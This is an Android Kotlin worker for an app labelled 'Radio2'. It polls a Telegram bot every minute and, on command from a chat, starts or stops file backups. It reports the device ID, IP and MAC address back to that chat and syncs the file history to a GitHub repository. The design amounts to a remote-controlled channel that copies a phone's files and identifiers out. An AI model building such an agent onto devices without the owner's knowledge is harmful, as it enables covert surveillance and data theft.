package com.service.assasinscreed02

import android.content.Context
import androidx.work.Worker
import androidx.work.WorkerParameters
import androidx.work.ExistingWorkPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit
import android.util.Log
import java.text.SimpleDateFormat
import java.util.*
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.first

class TelegramCommandWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "TelegramCommandWorker"
    }

    private val workerScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    override fun doWork(): Result {
        try {
            Log.d(TAG, "Iniciando escucha de comandos de Telegram")
            val config = obtenerConfigBot(applicationContext)
            if (config == null) {
                Log.w(TAG, "Configuración del bot no encontrada")
                return reprogramarWorker()
            }
            val (token, chatId) = config
            if (token.isBlank() || chatId.isBlank()) {
                Log.w(TAG, "Token o chat ID vacíos")
                return reprogramarWorker()
            }
            // Leer el último offset procesado
            val prefs = applicationContext.getSharedPreferences("telegram_offset", Context.MODE_PRIVATE)
            val lastOffset = prefs.getLong("last_update_id", 0L)
            val url = if (lastOffset > 0) {
                "https://api.telegram.org/bot$token/getUpdates?offset=${lastOffset + 1}"
            } else {
                "https://api.telegram.org/bot$token/getUpdates"
            }
            val request = Request.Builder().url(url).build()
            val client = OkHttpClient.Builder()
                .connectTimeout(30, TimeUnit.SECONDS)
                .readTimeout(30, TimeUnit.SECONDS)
                .build()
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val body = response.body?.string() ?: ""
                if (body.isNotBlank()) {
                    val maxUpdateId = procesarComandos(body, token, chatId)
                    // Guardar el nuevo offset si hay updates
                    if (maxUpdateId > 0) {
                        prefs.edit().putLong("last_update_id", maxUpdateId).apply()
                    }
                }
            } else {
                Log.w(TAG, "Error obteniendo updates: ${response.code}")
            }
            response.close()
        } catch (e: Exception) {
            Log.e(TAG, "Error en TelegramCommandWorker: ${e.message}", e)
        }
        return reprogramarWorker()
    }

    // Cambia el tipo de retorno a Long para devolver el último update_id procesado
    private fun procesarComandos(jsonResponse: String, token: String, chatId: String): Long {
        var maxUpdateId = 0L
        val chatIdLong = try { chatId.toLong() } catch (_: Exception) { 0L }
        try {
            val json = JSONObject(jsonResponse)
            if (!json.has("result")) {
                Log.w(TAG, "Respuesta de Telegram no contiene 'result'")
                return 0L
            }
            val result = json.getJSONArray("result")
            for (i in 0 until result.length()) {
                try {
                    val update = result.getJSONObject(i)
                    val updateId = update.optLong("update_id", 0L)
                    if (updateId > maxUpdateId) maxUpdateId = updateId
                    val message = update.optJSONObject("message") ?: continue
                    val fromChatIdLong = message.optJSONObject("chat")?.optLong("id") ?: continue
                    val text = message.optString("text", "")
                    // Solo procesar si el chat_id coincide y el texto no está vacío
                    if (fromChatIdLong == chatIdLong && text.isNotBlank()) {
                        procesarComando(text, token, chatId)
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "Error procesando mensaje: ${e.message}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error procesando comandos: ${e.message}", e)
        }
        return maxUpdateId
    }

    private fun procesarComando(text: String, token: String, chatId: String) {
        when {
            text.contains("/ayuda", ignoreCase = true) || text.contains("/help", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: ayuda")
                mostrarAyuda(token, chatId)
            }
            text.contains("/iniciar_backup", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: iniciar_backup")
                try {
                    // Verificar si el backup ya está activo
                    val workInfos = WorkManager.getInstance(applicationContext)
                        .getWorkInfosForUniqueWork("backup_trabajo")
                        .get()
                    val backupActivo = workInfos.any { it.state == androidx.work.WorkInfo.State.ENQUEUED || it.state == androidx.work.WorkInfo.State.RUNNING }
                    if (backupActivo) {
                        enviarConfirmacionTelegram(token, chatId, "✅ El backup automático ya está activo en el dispositivo.")
                    } else {
                        programarBackup(applicationContext, obtenerIntervalo(applicationContext).toLong())
                        enviarConfirmacionTelegram(token, chatId, "✅ Backup automático iniciado en el dispositivo.")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error iniciando backup: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error iniciando backup: "+e.message)
                }
            }
            text.contains("/backup_manual", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: backup_manual")
                try {
                    iniciarBackupManual(token, chatId)
                } catch (e: Exception) {
                    Log.e(TAG, "Error iniciando backup manual: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error iniciando backup manual: "+e.message)
                }
            }
            text.contains("/estado", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: estado")
                try {
                    val estado = obtenerEstadoBackup()
                    val mensaje = if (estado.isNullOrBlank()) "⚠️ No hay información de estado disponible." else "📊 Estado del backup: $estado"
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estado: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estado: "+e.message)
                }
            }
            text.contains("/estadisticas", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: estadisticas")
                try {
                    val estadisticas = obtenerEstadisticas()
                    enviarConfirmacionTelegram(token, chatId, estadisticas)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estadísticas: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estadísticas: "+e.message)
                }
            }
            text.contains("/configuracion", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: configuracion")
                try {
                    val config = obtenerConfiguracion()
                    val mensaje = if (config.isNullOrBlank()) "⚠️ No hay configuración disponible." else config
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo configuración: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo configuración: "+e.message)
                }
            }
            text.contains("/detener_backup", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: detener_backup")
                try {
                    detenerBackup()
                    enviarConfirmacionTelegram(token, chatId, "🛑 Backup automático detenido.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error deteniendo backup: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error deteniendo backup: "+e.message)
                }
            }
            text.contains("/limpiar_historial", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: limpiar_historial")
                try {
                    limpiarHistorial()
                    enviarConfirmacionTelegram(token, chatId, "🧹 Historial de archivos limpiado.")
                } catch (e: Exception) {
                    Log.e(TAG, "Error limpiando historial: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error limpiando historial: "+e.message)
                }
            }
            text.contains("/dispositivo", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: dispositivo")
                try {
                    val info = obtenerInfoDispositivo()
                    val mensaje = if (info.isNullOrBlank()) "⚠️ No hay información del dispositivo disponible." else info
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo info del dispositivo: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo info del dispositivo: "+e.message)
                }
            }
            text.contains("/device_info", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: device_info")
                try {
                    val info = obtenerDeviceInfoDetallado()
                    val mensaje = if (info.isNullOrBlank()) "⚠️ No hay información detallada del dispositivo disponible." else info
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo info detallada del dispositivo: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo info detallada del dispositivo: "+e.message)
                }
            }
            text.contains("/github_sync", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: github_sync")
                try {
                    syncWithGitHubFromTelegram(token, chatId)
                } catch (e: Exception) {
                    Log.e(TAG, "Error sincronizando con GitHub: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error sincronizando con GitHub: "+e.message)
                }
            }
            text.contains("/github_stats", ignoreCase = true) -> {
                Log.d(TAG, "Comando recibido: github_stats")
                try {
                    val stats = obtenerGitHubStats()
                    val mensaje = if (stats.isNullOrBlank()) "⚠️ No hay estadísticas de GitHub disponibles." else stats
                    Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    Log.e(TAG, "Error obteniendo estadísticas de GitHub: "+e.message)
                    enviarConfirmacionTelegram(token, chatId, "❌ Error obteniendo estadísticas de GitHub: "+e.message)
                }
            }
        }
    }

    private fun mostrarAyuda(token: String, chatId: String) {
        val ayuda = """
            🤖 *Comandos disponibles:*
            
            📋 */ayuda* - Muestra esta lista de comandos
            🔄 */iniciar_backup* - Inicia el backup automático
            📤 */backup_manual* - Ejecuta un backup manual inmediato
            📊 */estado* - Muestra el estado del backup
            📈 */estadisticas* - Muestra estadísticas de uso
            ⚙️ */configuracion* - Muestra la configuración actual
            🛑 */detener_backup* - Detiene el backup automático
            🧹 */limpiar_historial* - Limpia el historial de archivos
            📱 */dispositivo* - Información del dispositivo
            🔍 */device_info* - Información detallada del dispositivo
            🔄 */github_sync* - Sincroniza con GitHub
            📊 */github_stats* - Estadísticas de GitHub
            
            _Envía cualquier comando para ejecutarlo._
        """.trimIndent()
        val chatIdSecundario = obtenerChatIdSecundario(applicationContext)
        val mensaje = if (ayuda.isBlank()) "⚠️ No hay ayuda disponible." else ayuda
        Log.d(TAG, "Enviando mensaje a Telegram: '$mensaje'")
        enviarConfirmacionTelegram(token, chatIdSecundario ?: chatId, mensaje)
    }

    private fun iniciarBackupManual(token: String, chatId: String) {
        try {
            enviarConfirmacionTelegram(token, chatId, "🚀 Iniciando backup manual...")
            workerScope.launch {
                try {
                    val resultado = BackupUtils.ejecutarBackupManual(applicationContext)
                    val mensaje = if (resultado) {
                        "✅ Backup manual completado exitosamente"
                    } else {
                        "⚠️ Backup manual completado con errores"
                    }
                    enviarConfirmacionTelegram(token, chatId, mensaje)
                } catch (e: Exception) {
                    enviarConfirmacionTelegram(token, chatId, "❌ Error en backup manual: ${e.message}")
                }
            }
        } catch (e: Exception) {
            throw e
        }
    }

    private fun obtenerEstadisticas(): String {
        return try {
            val archivosSubidos = ErrorHandler.obtenerCantidadArchivosSubidos(applicationContext)
            val (ultima, anterior) = obtenerHistorial(applicationContext)
            val formato = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
            
            val ultimaStr = if (ultima != 0L) formato.format(Date(ultima)) else "Nunca"
            val anteriorStr = if (anterior != 0L) formato.format(Date(anterior)) else "Nunca"
            
            """
                📈 *Estadísticas del dispositivo:*
                
                📁 Archivos subidos: $archivosSubidos
                🕐 Última conexión: $ultimaStr
                ⏰ Conexión anterior: $anteriorStr
                📱 Dispositivo: ${android.os.Build.MODEL}
                🤖 Android: ${android.os.Build.VERSION.RELEASE}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo estadísticas: ${e.message}"
        }
    }

    private fun obtenerConfiguracion(): String {
        return try {
            val intervalo = obtenerIntervalo(applicationContext)
            val tiposArchivo = obtenerTiposArchivo(applicationContext)
            val backupPorFases = obtenerBackupPorFases(applicationContext)
            
            """
                ⚙️ *Configuración actual:*
                
                ⏰ Intervalo de backup: $intervalo horas
                📁 Tipos de archivo: ${tiposArchivo.joinToString(", ")}
                🔄 Backup por fases: ${if (backupPorFases) "Activado" else "Desactivado"}
                📱 Dispositivo: ${android.os.Build.MODEL}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo configuración: ${e.message}"
        }
    }

    private fun detenerBackup() {
        try {
            WorkManager.getInstance(applicationContext).cancelAllWorkByTag("backup_worker")
            WorkManager.getInstance(applicationContext).cancelUniqueWork("backup_trabajo")
        } catch (e: Exception) {
            throw e
        }
    }

    private fun limpiarHistorial() {
        try {
            ErrorHandler.limpiarRegistroArchivos(applicationContext)
        } catch (e: Exception) {
            throw e
        }
    }

    private fun obtenerInfoDispositivo(): String {
        return try {
            val deviceInfo = DeviceInfo(applicationContext).getDeviceData()
            
            """
                📱 *Información del dispositivo:*
                
                🆔 ID: ${deviceInfo.deviceId}
                📱 Dispositivo: ${deviceInfo.deviceName}
                🌐 IP: ${deviceInfo.ipAddress}
                📡 MAC: ${deviceInfo.macAddress}
                🤖 Android: ${deviceInfo.androidVersion}
                🏭 Fabricante: ${deviceInfo.manufacturer}
                📋 Modelo: ${deviceInfo.model}
                📦 App: Radio2 v1.0.0
                🕐 Última actualización: ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo info del dispositivo: ${e.message}"
        }
    }

    private fun obtenerDeviceInfoDetallado(): String {
        return try {
            val deviceInfo = DeviceInfo(applicationContext).getDeviceData()
            
            """
                🔍 *Información Detallada del Dispositivo:*
                
                🆔 *ID Único:* ${deviceInfo.deviceId}
                📱 *Nombre:* ${deviceInfo.deviceName}
                🌐 *Dirección IP:* ${deviceInfo.ipAddress}
                📡 *Dirección MAC:* ${deviceInfo.macAddress}
                🤖 *Versión Android:* ${deviceInfo.androidVersion}
                🏭 *Fabricante:* ${deviceInfo.manufacturer}
                📋 *Modelo:* ${deviceInfo.model}
                📦 *Aplicación:* Radio2 Backup v1.0.0
                🕐 *Timestamp:* ${deviceInfo.timestamp}
                
                📊 *Información JSON:*
                ```json
                ${DeviceInfo(applicationContext).getDeviceInfoJson()}
                ```
                
                🕐 *Última actualización:* ${SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo info detallada del dispositivo: ${e.message}"
        }
    }

    private fun syncWithGitHubFromTelegram(token: String, chatId: String) {
        try {
            enviarConfirmacionTelegram(token, chatId, "🔄 Iniciando sincronización con GitHub...")
            workerScope.launch {
                try {
                    val prefs = applicationContext.getSharedPreferences("github_config", Context.MODE_PRIVATE)
                    val githubToken = prefs.getString("github_token", "") ?: ""
                    
                    if (githubToken.isBlank()) {
                        enviarConfirmacionTelegram(token, chatId, "❌ GitHub no está configurado. Usa la app para configurarlo.")
                        return@launch
                    }
                    
                    val config = com.service.assasinscreed02.github.GitHubHistorialSync.GitHubConfig(
                        token = githubToken,
                        owner = prefs.getString("github_owner", "userserverbackup") ?: "userserverbackup",
                        repo = prefs.getString("github_repo", "radio2-backup-historial") ?: "radio2-backup-historial",
                        branch = prefs.getString("github_branch", "main") ?: "main"
                    )
                    
                    if (!config.isValid()) {
                        enviarConfirmacionTelegram(token, chatId, "⚠️ Configuración de GitHub incompleta")
                        return@launch
                    }
                    
                    val githubSync = com.service.assasinscreed02.github.GitHubHistorialSync(applicationContext)
                    
                    // Obtener historial local desde la base de datos
                    val repository = com.service.assasinscreed02.repository.BackupRepository(applicationContext)
                    val historialLocal = runBlocking {
                        withContext(Dispatchers.IO) {
                            repository.getAllFiles().first()
                        }
                    }
                    
                    val success = runBlocking {
                        withContext(Dispatchers.IO) {
                            githubSync.syncHistorialToGitHub(historialLocal, config)
                        }
                    }
                    
                    if (success) {
                        val stats = runBlocking {
                            withContext(Dispatchers.IO) {
                                githubSync.getGlobalStatistics(config)
                            }
                        }
                        val totalFiles = stats["totalFiles"] as? Int ?: 0
                        val totalSize = stats["totalSize"] as? Long ?: 0L
                        val sizeText = if (totalSize > 0) " (${formatFileSize(totalSize)})" else ""
                        enviarConfirmacionTelegram(token, chatId, "✅ Sincronización con GitHub exitosa\n📁 Total de archivos: $totalFiles$sizeText")
                    } else {
                        enviarConfirmacionTelegram(token, chatId, "❌ Error en la sincronización con GitHub")
                    }
                } catch (e: Exception) {
                    enviarConfirmacionTelegram(token, chatId, "❌ Error sincronizando con GitHub: ${e.message}")
                }
            }
        } catch (e: Exception) {
            throw e
        }
    }

    private fun obtenerGitHubStats(): String {
        return try {
            val prefs = applicationContext.getSharedPreferences("github_config", Context.MODE_PRIVATE)
            val githubToken = prefs.getString("github_token", "") ?: ""
            
            if (githubToken.isBlank()) {
                return "⚠️ GitHub no está configurado"
            }
            
            val config = com.service.assasinscreed02.github.GitHubHistorialSync.GitHubConfig(
                token = githubToken,
                owner = prefs.getString("github_owner", "userserverbackup") ?: "userserverbackup",
                repo = prefs.getString("github_repo", "radio2-backup-historial") ?: "radio2-backup-historial",
                branch = prefs.getString("github_branch", "main") ?: "main"
            )
            
            if (!config.isValid()) {
                return "⚠️ Configuración de GitHub incompleta"
            }
            
            val githubSync = com.service.assasinscreed02.github.GitHubHistorialSync(applicationContext)
            val stats = runBlocking {
                withContext(Dispatchers.IO) {
                    githubSync.getGlobalStatistics(config)
                }
            }
            
            val totalFiles = stats["totalFiles"] as? Int ?: 0
            val totalSize = stats["totalSize"] as? Long ?: 0L
            val successfulBackups = stats["successfulBackups"] as? Int ?: 0
            val failedBackups = stats["failedBackups"] as? Int ?: 0
            val lastSync = stats["lastSync"] as? Long ?: 0L
            
            val sdf = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
            val lastSyncStr = if (lastSync > 0) sdf.format(Date(lastSync)) else "Nunca"
            
            // Obtener información del dispositivo
            val deviceInfo = DeviceInfo(applicationContext).getDeviceData()
            
            """
                📊 *Estadísticas de GitHub:*
                
                📁 Total de archivos: $totalFiles
                💾 Tamaño total: ${formatFileSize(totalSize)}
                ✅ Backups exitosos: $successfulBackups
                ❌ Backups fallidos: $failedBackups
                🔄 Última sincronización: $lastSyncStr
                🌐 Repositorio: ${config.owner}/${config.repo}
                
                📱 *Información del Dispositivo:*
                🆔 ID: ${deviceInfo.deviceId}
                📱 Dispositivo: ${deviceInfo.deviceName}
                🌐 IP: ${deviceInfo.ipAddress}
                📡 MAC: ${deviceInfo.macAddress}
                🤖 Android: ${deviceInfo.androidVersion}
            """.trimIndent()
        } catch (e: Exception) {
            "Error obteniendo estadísticas de GitHub: ${e.message}"
        }
    }

    private fun formatFileSize(size: Long): String {
        return when {
            size < 1024 -> "$size B"
            size < 1024 * 1024 -> "${size / 1024} KB"
            size < 1024 * 1024 * 1024 -> "${size / (1024 * 1024)} MB"
            else -> "${size / (1024 * 1024 * 1024)} GB"
        }
    }
    
    private fun obtenerEstadoBackup(): String {
        return try {
            val workInfos = WorkManager.getInstance(applicationContext)
                .getWorkInfosForUniqueWork("backup_trabajo")
                .get()
            
            if (workInfos.isEmpty()) {
                "Servicio detenido"
            } else {
                val estado = workInfos[0].state
                when (estado) {
                    androidx.work.WorkInfo.State.ENQUEUED -> "Servicio programado"
                    androidx.work.WorkInfo.State.RUNNING -> "Servicio ejecutándose"
                    androidx.work.WorkInfo.State.SUCCEEDED -> "Última ejecución exitosa"
                    androidx.work.WorkInfo.State.FAILED -> "Última ejecución fallida"
                    else -> "Estado: $estado"
                }
            }
        } catch (e: Exception) {
            "Error obteniendo estado: ${e.message}"
        }
    }
    
    private fun reprogramarWorker(): Result {
        try {
            val next = OneTimeWorkRequestBuilder<TelegramCommandWorker>()
                .setInitialDelay(1, TimeUnit.MINUTES)
                .build()
                
            WorkManager.getInstance(applicationContext).enqueueUniqueWork(
                "telegram_command_listener",
                ExistingWorkPolicy.REPLACE,
                next
            )
            Log.d(TAG, "Worker reprogramado para ejecutarse en 1 minuto")
        } catch (e: Exception) {
            Log.e(TAG, "Error reprogramando worker: ${e.message}", e)
        }
        return Result.success()
    }

    override fun onStopped() {
        super.onStopped()
        workerScope.cancel()
    }
}

fun enviarConfirmacionTelegram(token: String, chatId: String, mensaje: String) {
    val maxReintentos = 5
    var intento = 1
    var backoff = 1000L // 1 segundo
    val maxBackoff = 60000L // 1 minuto
    while (intento <= maxReintentos) {
        try {
            val url = "https://api.telegram.org/bot$token/sendMessage"
            val json = org.json.JSONObject().apply {
                put("chat_id", chatId)
                put("text", mensaje)
                put("parse_mode", "Markdown")
            }
            val body = json.toString().toRequestBody("application/json".toMediaTypeOrNull())

            val request = Request.Builder()
                .url(url)
                .post(body)
                .build()

            val client = OkHttpClient.Builder()
                .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
                .build()

            val response = client.newCall(request).execute()
            val responseBody = response.body?.string() ?: ""
            if (response.isSuccessful) {
                Log.d("TelegramCommandWorker", "Mensaje enviado: $mensaje")
                response.close()
                break
            } else {
                // Manejo de error 429 (rate limit)
                if (response.code == 429) {
                    var retryAfter = 0L
                    try {
                        val jsonResp = org.json.JSONObject(responseBody)
                        retryAfter = jsonResp.optJSONObject("parameters")?.optLong("retry_after") ?: 0L
                    } catch (_: Exception) {}
                    if (retryAfter > 0) {
                        Log.w("TelegramCommandWorker", "Error 429: esperando $retryAfter segundos antes de reintentar")
                        Thread.sleep(retryAfter * 1000)
                    } else {
                        Log.w("TelegramCommandWorker", "Error 429: esperando $backoff ms antes de reintentar")
                        Thread.sleep(backoff)
                        backoff = (backoff * 2).coerceAtMost(maxBackoff)
                    }
                    intento++
                } else {
                    Log.w("TelegramCommandWorker", "Error enviando mensaje: ${response.code} - $responseBody")
                    response.close()
                    break
                }
            }
            response.close()
        } catch (e: Exception) {
            Log.e("TelegramCommandWorker", "Error enviando confirmación: ${e.message}", e)
            try { Thread.sleep(backoff) } catch (_: Exception) {}
            backoff = (backoff * 2).coerceAtMost(maxBackoff)
            intento++
        }
    }
    if (intento > maxReintentos) {
        Log.e("TelegramCommandWorker", "No se pudo enviar el mensaje tras $maxReintentos intentos: $mensaje")
    }
} 

// Añadir función para obtener chat_id secundario
private fun obtenerChatIdSecundario(context: Context): String? {
    return try {
        val prefs = context.getSharedPreferences("BotConfig", Context.MODE_PRIVATE)
        prefs.getString("bot_chat_id_secundario", null)
    } catch (e: Exception) {
        null
    }
} 